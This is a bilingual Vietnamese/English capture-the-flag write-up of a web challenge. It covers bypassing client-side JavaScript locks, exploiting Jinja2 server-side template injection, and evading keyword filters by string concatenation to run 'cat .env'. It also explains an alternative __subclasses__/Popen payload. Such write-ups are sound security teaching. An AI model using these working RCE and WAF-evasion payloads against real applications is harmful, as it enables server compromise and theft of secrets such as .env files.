# EnigmaXplore 3.0 — Announce Your Name

**Thể loại:** Web

**Độ khó:** Dễ

---

## Tổng quan thử thách

Thử thách cung cấp một trang web với một biểu mẫu (form) nhập liệu duy nhất. Biểu mẫu này được bảo vệ bởi một loạt các cơ chế JavaScript phía client để ngăn người dùng nhập và gửi dữ liệu. Nhiệm vụ của người chơi là vượt qua lớp bảo vệ phía client, phát hiện và khai thác lỗ hổng Server-Side Template Injection (SSTI) ở phía server, sau đó tiếp tục vượt qua nhiều lớp tường lửa ứng dụng web (WAF) để đạt được khả năng thực thi mã từ xa (RCE) và đọc file chứa cờ (flag).

---

## Mục tiêu

Mục tiêu chính là thực hiện một chuỗi các kỹ thuật bypass để khai thác lỗ hổng SSTI, cuối cùng là thực thi lệnh trên hệ điều hành của máy chủ để đọc nội dung file `.env` và lấy được cờ.

---

## Kiến thức cần thiết

Để giải quyết thử thách này, người chơi cần có kiến thức về:

- **JavaScript & Developer Tools:** Sử dụng Bảng điều khiển (Console) của trình duyệt để vô hiệu hóa các trình xử lý sự kiện (event listener) và các hàm hẹn giờ (`setInterval`).
- **Server-Side Template Injection (SSTI):** Hiểu và xác định được lỗ hổng SSTI, đặc biệt là cú pháp của template engine Jinja2 (Python/Flask).
- **Khai thác SSTI trong Python:** Xây dựng payload để truy cập vào các đối tượng và module của Python nhằm thực thi mã lệnh.
- **Kỹ thuật Bypass WAF/Filter:** Nhận biết và vượt qua các bộ lọc bảo mật bằng cách sử dụng các cú pháp thay thế như truy cập thuộc tính bằng `[]`, sử dụng hàm `getattr()`, và kỹ thuật nối chuỗi (string concatenation) để che giấu các từ khóa nguy hiểm.

---

## Phân tích và hướng tiếp cận

Đây là một thử thách nhiều giai đoạn, đòi hỏi sự kiên nhẫn và khả năng phân tích thông báo lỗi để hiểu rõ các cơ chế phòng thủ của máy chủ.

1. **Giai đoạn 1: Vượt qua bảo vệ phía Client**
    - Phân tích mã nguồn JavaScript cho thấy ô nhập liệu bị khóa bởi các sự kiện `focus`, `keydown` và một vòng lặp `setInterval`.
    - Sử dụng Console của trình duyệt để gỡ bỏ các event listener và xóa vòng lặp `setInterval`, từ đó mở khóa hoàn toàn ô nhập liệu.
2. **Giai đoạn 2: Phát hiện lỗ hổng SSTI**
    - Sau khi gửi một chuỗi văn bản thông thường và thấy nó được phản chiếu lại, bước tiếp theo là kiểm tra các lỗ hổng injection.
    - Gửi payload `{{ 7 * 7 }}`. Máy chủ trả về kết quả `49` thay vì chuỗi gốc. Đây là bằng chứng không thể chối cãi của lỗ hổng Server-Side Template Injection, rất có thể là Jinja2.
3. **Giai đoạn 3: Khai thác SSTI và đối mặt với WAF**
    - Xây dựng một payload SSTI cơ bản để thực thi lệnh, ví dụ: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}`.
    - Quá trình khai thác gặp phải một loạt các lỗi, mỗi lỗi tiết lộ một quy tắc của WAF:
        - **Lỗi `expected name or number`:** Gợi ý rằng dấu chấm (`.`) bị lọc. Giải pháp là chuyển sang cú pháp `['attribute']`.
        - **Lỗi `has no attribute '[REDACTED]'`:** Cho thấy WAF đang tìm và xóa các từ khóa nhạy cảm như `__globals__`. Giải pháp là thử dùng `getattr()`.
        - **Lỗi `unexpected ')'`:** Hàm `getattr()` lồng nhau có thể đã kích hoạt một bộ lọc mẫu hình (pattern filter). Giải pháp là quay lại cú pháp `['attribute']` nhưng kết hợp với **nối chuỗi** để che giấu từ khóa (ví dụ: `['__glo' + 'bals__']`).
        - **Lỗi `has no attribute 'p[REDACTED]'`:** Tiết lộ rằng WAF cũng lọc cả tên các hàm hệ thống nguy hiểm như `open`. Giải pháp là áp dụng kỹ thuật nối chuỗi cho cả tên hàm (`['pop' + 'en']`).
4. **Giai đoạn 4: Tìm và Đọc Flag**
    - Sau khi xây dựng thành công một payload RCE hoàn chỉnh, lệnh `cat /flag.txt` trả về kết quả rỗng.
    - Sử dụng payload để chạy lệnh `ls -la` và do thám hệ thống file. Kết quả cho thấy sự tồn tại của file `.env`.
    - Thay đổi lệnh trong payload thành `cat .env` để đọc nội dung file này và lấy được cờ cuối cùng.

---

## Kịch bản giải mã (Exploit)

Quá trình khai thác bao gồm hai phần: mã JavaScript để mở khóa form và payload SSTI cuối cùng.

**1. Mã JavaScript để mở khóa ô nhập liệu (chạy trong Console):**

```jsx
const trickInput = document.getElementById('trick');
trickInput.removeEventListener('focus', window.trickFocus);
trickInput.removeEventListener('keydown', window.trickKeyHandler);
for (let i = 0; i < 1000; i++) { clearInterval(i); }
trickInput.readOnly = false;
trickInput.dataset.locked = '0';

```

**2. Payload SSTI cuối cùng để đọc flag (đặt vào ô nhập liệu):**

Payload này được thiết kế để vượt qua tất cả các bộ lọc đã được phát hiện.

```python
{{ self['__in' + 'it__']['__glo' + 'bals__']['__buil' + 'tins__']['__im' + 'port__']('os')['pop' + 'en']('cat .env')['re' + 'ad']() }}

```

---

## Kết quả (Flag)

Sau khi gửi payload SSTI cuối cùng, máy chủ thực thi lệnh và trả về nội dung của file `.env`.

`FLAG=EnXp{N01T53UQFTC34T3DAM5A47ANUK}`

---

## Ghi chú và mẹo

- Đây là một ví dụ điển hình về một thử thách web có chiều sâu, nơi lớp bảo vệ ban đầu (JavaScript) chỉ là khởi đầu.
- Luôn phân tích kỹ các thông báo lỗi từ máy chủ. Chúng là những manh mối quý giá nhất để hiểu và vượt qua các cơ chế lọc của WAF.
- Khi một kỹ thuật bypass bị chặn, hãy luôn nghĩ đến các cách khác để thực hiện cùng một hành động trong ngôn ngữ/framework mục tiêu (ví dụ: 3 cách truy cập thuộc tính trong Python).
- Kỹ thuật nối chuỗi là một phương pháp rất hiệu quả để vượt qua các bộ lọc dựa trên từ khóa tĩnh.

---

# ENGLISH VERSION

**Category:** Web

**Difficulty:** Easy

---

## Challenge Overview

The challenge presents a webpage with a single input form. This form is protected by client-side JavaScript mechanisms designed to prevent user input and submission. The player's task is to bypass the client-side protections, discover and exploit a Server-Side Template Injection (SSTI) vulnerability on the backend, and then subsequently bypass multiple layers of a Web Application Firewall (WAF) to achieve Remote Code Execution (RCE) and read the flag file.

---

## Objective

The main objective is to execute a series of bypass techniques to exploit an SSTI vulnerability, ultimately achieving command execution on the server's operating system to read the contents of the `.env` file and retrieve the flag.

---

## Required Knowledge

To solve this challenge, players need knowledge of:

- **JavaScript & Developer Tools:** Using the browser's Console to disable event listeners and timed functions (`setInterval`).
- **Server-Side Template Injection (SSTI):** Understanding and identifying SSTI vulnerabilities, specifically the syntax for the Jinja2 template engine (Python/Flask).
- **SSTI Exploitation in Python:** Crafting payloads to access Python's objects and modules to achieve command execution.
- **WAF/Filter Bypassing Techniques:** Recognizing and circumventing security filters using alternative syntaxes like bracket notation for attribute access `[]`, the `getattr()` function, and string concatenation to obfuscate dangerous keywords.

---

## Analysis and Approach

This is a multi-stage challenge that requires patience and the ability to analyze error messages to understand the server's defense mechanisms.

1. **Stage 1: Bypassing Client-Side Protections**
    - Analyzing the JavaScript source code reveals that the input field is locked by `focus` and `keydown` event listeners, as well as a `setInterval` loop.
    - The browser's Console is used to remove the event listeners and clear the interval, fully unlocking the input field.
2. **Stage 2: Discovering the SSTI Vulnerability**
    - After submitting a normal string and seeing it reflected, the next step is to test for injection vulnerabilities.
    - Submitting the payload `{{ 7 * 7 }}` results in the server returning `49` instead of the original string. This is definitive proof of an SSTI vulnerability, likely Jinja2.
3. **Stage 3: SSTI Exploitation and WAF Confrontation**
    - A basic SSTI payload for RCE is crafted, e.g., `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}`.
    - The exploitation process is met with a series of errors, each revealing a WAF rule:
        - **Error `expected name or number`:** Suggests that the dot character (`.`) is filtered. The solution is to switch to bracket notation `['attribute']`.
        - **Error `has no attribute '[REDACTED]'`:** Shows the WAF is finding and removing sensitive keywords like `__globals__`. The solution is to try `getattr()`.
        - **Error `unexpected ')'`:** The nested `getattr()` calls likely triggered a pattern-based filter. The solution is to revert to bracket notation but combine it with **string concatenation** to hide keywords (e.g., `['__glo' + 'bals__']`).
        - **Error `has no attribute 'p[REDACTED]'`:** Reveals the WAF also filters dangerous function names like `open`. The solution is to apply string concatenation to the function names as well (`['pop' + 'en']`).
4. **Stage 4: Finding and Reading the Flag**
    - After successfully crafting a full RCE payload, the command `cat /flag.txt` returns an empty result.
    - The payload is used to run `ls -la` to perform reconnaissance on the file system. The output reveals the existence of a `.env` file.
    - The command in the payload is changed to `cat .env` to read the contents of this file, revealing the final flag.

---

## Exploit Script

The exploit consists of two parts: the JavaScript to unlock the form and the final SSTI payload.

**1. JavaScript to unlock the input field (run in Console):**

```jsx
const trickInput = document.getElementById('trick');
trickInput.removeEventListener('focus', window.trickFocus);
trickInput.removeEventListener('keydown', window.trickKeyHandler);
for (let i = 0; i < 1000; i++) { clearInterval(i); }
trickInput.readOnly = false;
trickInput.dataset.locked = '0';

```

**2. Final SSTI Payload to read the flag (placed in the input field):**

This payload is engineered to bypass all identified filters.

```python
{{ self['__in' + 'it__']['__glo' + 'bals__']['__buil' + 'tins__']['__im' + 'port__']('os')['pop' + 'en']('cat .env')['re' + 'ad']() }}

```

---

## Result (Flag)

After submitting the final SSTI payload, the server executes the command and returns the content of the `.env` file.

`FLAG=EnXp{N01T53UQFTC34T3DAM5A47ANUK}`

---

## Postmortem / Tips

- This is a classic example of a deep web challenge where the initial barrier (JavaScript) is just a warm-up.
- Always analyze server error messages carefully. They are the most valuable clues for understanding and bypassing WAF filters.
- When one bypass technique is blocked, always consider alternative ways to perform the same action in the target language/framework (e.g., the 3 ways to access attributes in Python).
- String concatenation is a highly effective method for defeating static keyword-based filters.

---

# Alternative

Đây là một payload khai thác SSTI kinh điển và cực kỳ mạnh mẽ. Việc nó cũng hoạt động thành công cho thấy một góc nhìn khác về cách khai thác lỗ hổng này, và lý do nó thành công là vì nó đi một con đường hoàn toàn khác để đạt được cùng một mục tiêu: **thực thi lệnh hệ thống**.

Hãy cùng phân tích chi tiết payload này: `{{''.__class__.__base__.__subclasses__()[506]('cat .env', shell=True, stdout=-1).communicate()}}`

---

### Tại sao nó hoạt động? Phân tích từng bước

Payload này là một chuỗi dài các lệnh gọi thuộc tính và phương thức để "đi lang thang" trong bộ nhớ của ứng dụng Python nhằm tìm kiếm một công cụ có thể thực thi lệnh mà **không cần phải `import os` một cách tường minh**.

1. **`''`**
    - Bắt đầu với một đối tượng vô hại: một chuỗi rỗng.
2. **`.__class__`**
    - Lấy lớp (class) của đối tượng chuỗi rỗng, đó chính là lớp `str`.
3. **`.__base__`**
    - Lấy lớp cha (base class) của lớp `str`. Trong Python, lớp cha cơ bản của hầu hết mọi thứ là lớp `object`. Đây là "tổ tiên" của tất cả các lớp.
4. **`.__subclasses__()`**
    - **Đây là bước "thần kỳ"**. Phương thức này được gọi trên lớp `object` và nó trả về một danh sách (list) **tất cả các lớp con** hiện đang được nạp trong bộ nhớ của trình thông dịch Python mà kế thừa từ lớp `object`. Về cơ bản, nó cho chúng ta một danh sách của "mọi công cụ có sẵn" trong ứng dụng.
5. **`[506]`**
    - Đây là một "con số ma thuật" (magic number). Người tạo ra payload này đã tìm ra rằng, trong môi trường cụ thể của máy chủ thử thách, lớp ở vị trí (index) thứ 506 trong danh sách các lớp con đó chính là lớp **`subprocess.Popen`**. Lớp này là công cụ tiêu chuẩn của Python để tạo và quản lý các tiến trình con (subprocesses), bao gồm cả việc thực thi các lệnh của hệ điều hành.
    - *Lưu ý: Con số này không cố định. Nó phụ thuộc vào phiên bản Python và các thư viện được import trên máy chủ.*
6. **`('cat .env', shell=True, stdout=-1)`**
    - Bây giờ, chúng ta đang gọi hàm khởi tạo của lớp `subprocess.Popen` với các tham số sau:
        - `'cat .env'`: Lệnh chúng ta muốn thực thi.
        - `shell=True`: Yêu cầu thực thi lệnh thông qua trình bao (shell) của hệ thống.
        - `stdout=-1`: Tương đương với `subprocess.PIPE`. Nó ra lệnh cho tiến trình **bắt giữ (capture) đầu ra tiêu chuẩn (standard output)** của lệnh thay vì chỉ in nó ra console của máy chủ.
7. **`.communicate()`**
    - Phương thức này được gọi trên đối tượng `Popen` vừa được tạo. Nó thực thi lệnh, đợi lệnh hoàn thành, và sau đó trả về một tuple chứa `(stdout_data, stderr_data)`. `stdout_data` chính là kết quả của lệnh `cat .env` mà chúng ta cần.

Khi template engine render toàn bộ biểu thức này, nó sẽ in ra kết quả của hàm `communicate()`, chính là nội dung của file `.env`.

---

### So sánh với phương pháp trước (`os.popen`)

| Đặc điểm | Phương pháp `os.popen` (của bạn) | Phương pháp `subclasses` (mới) |
| --- | --- | --- |
| **Chiến lược** | Tìm đường đến hàm `__import__` để chủ động nạp (import) module `os` và sử dụng nó. | Không import gì cả. Thay vào đó, tìm kiếm trong bộ nhớ một lớp *đã có sẵn* (`subprocess.Popen`) có khả năng thực thi lệnh. |
| **Ưu điểm** | - Khá trực tiếp và dễ đọc hơn nếu bạn đã quen. | - **Cực kỳ tàng hình (stealthy)**. Nó không bao giờ sử dụng các chuỗi bị nghi ngờ như `'os'` hay `'__import__'`, khiến nó có khả năng **vượt qua các WAF** chặn các từ khóa đó. |
| **Nhược điểm** | - Dễ bị WAF phát hiện và chặn vì nó sử dụng các từ khóa rất nhạy cảm (`import`, `os`, `popen`). | - Phụ thuộc vào "magic number" (ví dụ: `506`), con số này có thể thay đổi giữa các môi trường khác nhau. Cần phải dò tìm hoặc viết kịch bản để liệt kê các lớp con và tìm đúng index. |

**Tóm lại:** Payload `subclasses` thành công vì nó là một kỹ thuật bypass cao cấp hơn, được thiết kế đặc biệt để né tránh các bộ lọc thông minh cấm việc import hoặc gọi các module hệ thống một cách trực tiếp. Nó tận dụng bản chất năng động của Python để tìm và sử dụng các công cụ đã có sẵn trong bộ nhớ ứng dụng. Việc bạn tìm ra và sử dụng được cả hai phương pháp cho thấy bạn có một sự hiểu biết rất sâu sắc về cách khai thác lỗ hổng này.
